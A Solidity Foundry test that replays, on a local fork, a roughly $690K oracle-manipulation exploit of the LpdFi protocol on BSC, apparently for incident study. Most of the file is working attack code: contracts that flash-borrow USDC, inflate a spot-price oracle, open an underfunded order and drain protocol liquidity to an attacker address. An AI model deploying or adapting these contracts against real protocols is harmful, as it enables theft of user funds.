// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~690K USDC (~$690K)
// Attacker : 0x5d289266d85ef671561ba3f253fb79327c193f33
// Attack Contract : 0x7f5ad0a998dcb3f5006f0d152bebc055979ef711
// Vulnerable Contract : 0xce6a6e4413d85a136bbac8aae6fb46eaa77f295e (LpdFi)
// Vulnerable Token Oracle : 0x38763eebe58a69c9cc91876947d9fb83e1273604 (Lpd.price)
// Attack Tx (claim) : https://bscscan.com/tx/0x70bbe0aa3c7ef149ecb6128a06025885deaa8fef3f393a505d447d28ab3315d6
// Setup Tx (buy) : https://bscscan.com/tx/0xbb5b8573d7203e00f8fb9d4839dbeea46a8efd367eac8bed81e4ece2341c3588

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xce6a6e4413d85a136bbac8aae6fb46eaa77f295e#code
// Lpd token : https://bscscan.com/address/0x38763eebe58a69c9cc91876947d9fb83e1273604#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2084157533204197380
//
// Lpd.price() reads unguarded PancakeSwap LPD/USDC spot reserves. In the buy tx (issue 18, last
// second of the period) the attacker flash-borrowed ~tens of millions USDC, dumped them into the
// LPD/USDC pair (inflating spot), and opened a LpdFi order with uAmount ≈ 140.3M while depositing
// only ~214k LPD. One second later (issue 19) claimInterest paid 0.5% * uAmount ≈ 701.6k USDC by
// burning nearly all of the protocol's LP and sending 99% to the caller.

address constant ATTACKER = 0x5d289266d85EF671561bA3F253FB79327C193f33;
address constant ATTACK_CONTRACT = 0x7f5AD0A998Dcb3f5006F0D152BEBC055979EF711;
address constant LPD_FI = 0xcE6A6e4413D85A136bBaC8AaE6fB46eAa77F295e;
address constant LPD = 0x38763EebE58a69C9CC91876947D9fB83e1273604;
// Named USDC_TOKEN / USDT_TOKEN to avoid clashing with `interface USDC` / `interface USDT` in interface.sol
address constant USDC_TOKEN = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
address constant LPD_USDC_PAIR = 0x85346d31743796F7d00D675629e32783A968F210;
address constant BINDING = 0x902768873a5733870288E96371bC2ca33D4bF916;
// Pancake USDT/USDC pair — used as a flash-loan source for the optional full repro.
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant USDT_USDC_PAIR = 0xEc6557348085Aa57C72514D67070dC863C0a5A8c;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

interface ILpdFi {
    function buy(
        uint256 uAmount
    ) external;
    function claimInterest(
        uint256 id
    ) external;
    function getOrder(
        address account,
        uint256 orderId
    )
        external
        view
        returns (
            uint64 startIssue,
            uint64 lastIssue,
            uint8 status,
            uint256 tokenAmount,
            uint256 uAmount,
            uint256 interestRate,
            uint256 interestClaimable,
            uint256 interestClaimed,
            uint256 interestTop
        );
    function orderLength(
        address account
    ) external view returns (uint256);
    function getIssue() external view returns (uint64);
    function pair() external view returns (address);
    function token() external view returns (address);
    function investedUAmount() external view returns (uint256);
}

interface ILpd {
    function price() external view returns (uint256);
    function balanceOf(
        address
    ) external view returns (uint256);
    function approve(
        address,
        uint256
    ) external returns (bool);
    function transfer(
        address,
        uint256
    ) external returns (bool);
}

interface IBinding {
    function bind(
        bytes8 code
    ) external;
    function parents(
        address
    ) external view returns (address);
    function accountCode(
        address
    ) external view returns (bytes8);
    function root() external view returns (address);
}

interface IPancakePairExt is IPancakePair {
    function sync() external;
    function skim(
        address to
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    /// @dev Pre-claim state: buy already landed in block 113613923 (issue 18).
    /// Claim happened in block 113613924 at the first second of issue 19.
    uint256 constant FORK_BLOCK = 113_613_923;

    function setUp() public {
        // BSC offline port 8546 (see _shared/run-poc/chains.conf)
        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);
        fundingToken = USDC_TOKEN;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(LPD_FI, "LpdFi");
        vm.label(LPD, "LPD");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(LPD_USDC_PAIR, "LPD/USDC pair");
        vm.label(BINDING, "Binding");
        vm.label(USDT_USDC_PAIR, "USDT/USDC pair");
        vm.label(PANCAKE_ROUTER, "Pancake router");
    }

    /// @notice Replays the claim half of the real exploit (the drain).
    /// The inflated order already exists on ATTACK_CONTRACT from the buy tx one block earlier.
    function testExploit() public {
        // Cross the issue boundary: issue 18 → 19 (matches block 113613924 timestamp).
        vm.warp(block.timestamp + 1);
        assertEq(ILpdFi(LPD_FI).getIssue(), 19, "issue 19");

        // Confirm the underfunded order is live: ~214k LPD deposited for ~140.3M uAmount.
        (
            uint64 startIssue,
            uint64 lastIssue,
            uint8 status,
            uint256 tokenAmount,
            uint256 uAmount,
            ,
            uint256 interestClaimable,
            ,
            uint256 interestTop
        ) = ILpdFi(LPD_FI).getOrder(ATTACK_CONTRACT, 0);
        assertEq(uint256(status), 1, "active");
        assertEq(startIssue, 18);
        assertEq(lastIssue, 18);
        assertEq(tokenAmount, 214_171_515_306_781_626_633_142);
        assertEq(uAmount, 140_324_732_000_000_000_000_000_000);
        // One issue of interest: 0.5% * uAmount ≈ 701_623.66 USDC
        assertEq(interestClaimable, 701_623_660_000_000_000_000_000);
        assertEq(interestTop, 70_162_366_000_000_000_000_000_000);

        // Etch a clean teaching exploit over the real attack contract so claimInterest
        // still runs as the order owner (msg.sender) while we control the bytecode.
        LpdFiExploit logic = new LpdFiExploit(ATTACKER);
        vm.etch(ATTACK_CONTRACT, address(logic).code);

        uint256 before = IERC20(USDC_TOKEN).balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        LpdFiExploit(ATTACK_CONTRACT).attack();

        uint256 profit = IERC20(USDC_TOKEN).balanceOf(ATTACKER) - before;
        logTokenBalance(USDC_TOKEN, ATTACKER, "Attacker Final");
        // Real claim sent ~693_529.79 USDC (99% of removeLp output) to the attack contract,
        // which then forwarded ~689_529.79 to the EOA after a small WBNB tip swap.
        assertGt(profit, 690_000 ether, "USDC profit from claimInterest drain");
        emit log_named_decimal_uint("Attacker USDC profit", profit, 18);
    }
}

/// @dev Teaching exploit used both as a standalone deployable and (via vm.etch) as the
///      bytecode of the real attack contract so msg.sender for claimInterest is the order owner.
contract LpdFiExploit {
    address private immutable profitReceiver;

    ILpdFi private constant lpdFi = ILpdFi(LPD_FI);
    IERC20 private constant usdc = IERC20(USDC_TOKEN);
    IPancakePairExt private constant pair = IPancakePairExt(LPD_USDC_PAIR);

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    /// @notice Drain protocol LP via claimInterest on the underfunded order (id 0).
    function attack() external {
        // step 1: donate residual USDC from the buy phase into the LPD/USDC pair and sync.
        // After the real buy, the attack contract holds ~3440.995 USDC. Donating (almost) all of
        // it raises r_usdc just enough that removeLp(interestClaimable) needs
        // needLp ≤ protocol LP balance (without it, needLp overflows the balance by ~0.5%).
        uint256 dust = usdc.balanceOf(address(this));
        if (dust > 1) {
            // leave 1 wei so the later profit transfer still runs cleanly if needed
            usdc.transfer(address(pair), dust - 1);
            pair.sync();
        }

        // step 2: claim one issue of interest on the manipulated order.
        // removeLp(interestClaimable) burns nearly all protocol LP and pays ~99% USDC to msg.sender.
        lpdFi.claimInterest(0);

        // step 3: forward USDC profit to the attacker EOA.
        uint256 bal = usdc.balanceOf(address(this));
        if (bal > 0) {
            usdc.transfer(profitReceiver, bal);
        }
    }
}

/// @dev Optional full buy-side repro helpers (used by analysis / extended tests).
/// Opens an underfunded order by inflating Lpd.price() via USDC donation + sync, then buying.
contract LpdFiBuyExploit {
    address private immutable profitReceiver;

    ILpdFi private constant lpdFi = ILpdFi(LPD_FI);
    ILpd private constant lpd = ILpd(LPD);
    IERC20 private constant usdc = IERC20(USDC_TOKEN);
    IBinding private constant binding = IBinding(BINDING);
    IPancakePairExt private constant lpdPair = IPancakePairExt(LPD_USDC_PAIR);
    IPancakePair private constant flashPair = IPancakePair(USDT_USDC_PAIR);
    IPancakeRouter private constant router = IPancakeRouter(payable(PANCAKE_ROUTER));

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function bindWithRoot() external {
        bytes8 rootCode = binding.accountCode(binding.root());
        binding.bind(rootCode);
    }

    /// @notice Flash USDC, inflate LPD spot, open a huge uAmount order with little LPD, repay.
    function openOrder(
        uint256 flashUsdc,
        uint256 uAmount
    ) external {
        require(msg.sender == profitReceiver, "only receiver");
        // USDT is token0 on USDT/USDC? On BSC USDC < USDT lexicographically? Check:
        // USDC 0x8ac7... USDT 0x55d3... → USDT is token0, USDC token1 on many pairs.
        // USDT_USDC_PAIR 0xec65...: typically token0=USDT token1=USDC.
        flashPair.swap(0, flashUsdc, address(this), bytes("buy"));
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(msg.sender == USDT_USDC_PAIR, "not flash pair");
        require(sender == address(this), "bad sender");
        uint256 borrowed = amount1; // USDC

        // Acquire a modest amount of LPD before skewing the pool too hard.
        uint256 seedUsdc = 50_000 ether;
        usdc.approve(PANCAKE_ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = USDC_TOKEN;
        path[1] = LPD;
        router.swapExactTokensForTokens(seedUsdc, 0, path, address(this), block.timestamp);

        // Donate the bulk of USDC into the LPD/USDC pair and sync → Lpd.price() skyrockets.
        uint256 donate = usdc.balanceOf(address(this)) - 1_000 ether;
        usdc.transfer(address(lpdPair), donate);
        lpdPair.sync();

        // Open the underfunded order: tokenAmount = uAmount * 1e18 / price (now tiny).
        uint256 price = lpd.price();
        // Use whatever uAmount fits our LPD balance (multiple of 1e18).
        uint256 bal = lpd.balanceOf(address(this));
        require(bal > 0, "no lpd");
        uint256 uAmt = (bal * price) / 1e18;
        uAmt = (uAmt / 1 ether) * 1 ether; // NeedMultipleMinAmount
        require(uAmt >= 1 ether, "uAmt");
        lpd.approve(LPD_FI, type(uint256).max);
        lpdFi.buy(uAmt);

        // Recover donated USDC by swapping remaining LPD back, then repay flash.
        uint256 lpdLeft = lpd.balanceOf(address(this));
        if (lpdLeft > 0) {
            lpd.approve(PANCAKE_ROUTER, lpdLeft);
            path[0] = LPD;
            path[1] = USDC_TOKEN;
            router.swapExactTokensForTokens(lpdLeft, 0, path, address(this), block.timestamp);
        }

        // Repay flash (0.25% fee on Pancake V2).
        uint256 repay = (borrowed * 10_000) / 9975 + 1;
        usdc.transfer(USDT_USDC_PAIR, repay);

        // Leftover USDC stays on this contract (buy-phase may be net-negative; claim is the profit).
        uint256 left = usdc.balanceOf(address(this));
        if (left > 0) {
            usdc.transfer(profitReceiver, left);
        }
    }

    function claimAndProfit() external {
        require(msg.sender == profitReceiver, "only receiver");
        lpdFi.claimInterest(0);
        uint256 bal = usdc.balanceOf(address(this));
        if (bal > 0) {
            usdc.transfer(profitReceiver, bal);
        }
    }
}
